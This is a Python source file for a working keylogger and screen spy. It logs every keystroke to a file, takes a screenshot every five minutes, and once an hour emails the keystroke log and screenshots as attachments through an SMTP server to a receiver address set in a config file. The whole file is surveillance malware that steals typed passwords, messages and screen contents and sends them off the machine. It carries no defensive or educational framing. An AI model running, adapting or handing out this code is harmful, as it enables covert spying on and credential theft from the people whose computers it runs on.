import threading
import time
import os
import json
from pynput import keyboard
from PIL import ImageGrab
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# Load email configuration
with open('config/email_config.json') as config_file:
    config = json.load(config_file)

def on_press(key):
    try:
        with open("keystrokes.txt", "a") as f:
            f.write(f'{key.char}')
    except AttributeError:
        with open("keystrokes.txt", "a") as f:
            f.write(f'{key}')

def capture_screenshot(interval=300):
    if not os.path.exists('screenshots'):
        os.makedirs('screenshots')
    while True:
        try:
            screenshot = ImageGrab.grab()
            screenshot.save(f'screenshots/screenshot_{time.strftime("%Y%m%d-%H%M%S")}.png')
        except Exception as e:
            print(f"Error capturing screenshot: {e}")
        time.sleep(interval)

def create_email():
    msg = MIMEMultipart()
    msg['From'] = config['sender_email']
    msg['To'] = config['receiver_email']
    msg['Subject'] = 'Logged Data'

    if os.path.exists('keystrokes.txt'):
        with open('keystrokes.txt', 'rb') as f:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', 'attachment; filename="keystrokes.txt"')
            msg.attach(part)

    for screenshot in os.listdir('screenshots'):
        if screenshot.startswith('screenshot_'):
            with open(f'screenshots/{screenshot}', 'rb') as f:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(f.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f'attachment; filename="{screenshot}"')
                msg.attach(part)
    return msg

def send_email(interval=3600):
    while True:
        try:
            msg = create_email()
            with smtplib.SMTP(config['smtp_server'], config['smtp_port']) as server:
                server.starttls()
                server.login(config['sender_email'], config['password'])
                server.sendmail(config['sender_email'], config['receiver_email'], msg.as_string())
        except Exception as e:
            print(f"Error sending email: {e}")
        time.sleep(interval)

if __name__ == "__main__":
    try:
        listener = keyboard.Listener(on_press=on_press)
        listener.start()

        screenshot_thread = threading.Thread(target=capture_screenshot)
        screenshot_thread.start()

        email_thread = threading.Thread(target=send_email)
        email_thread.start()

        listener.join()
        screenshot_thread.join()
        email_thread.join()
    except Exception as e:
        print(f"An error occurred: {e}")
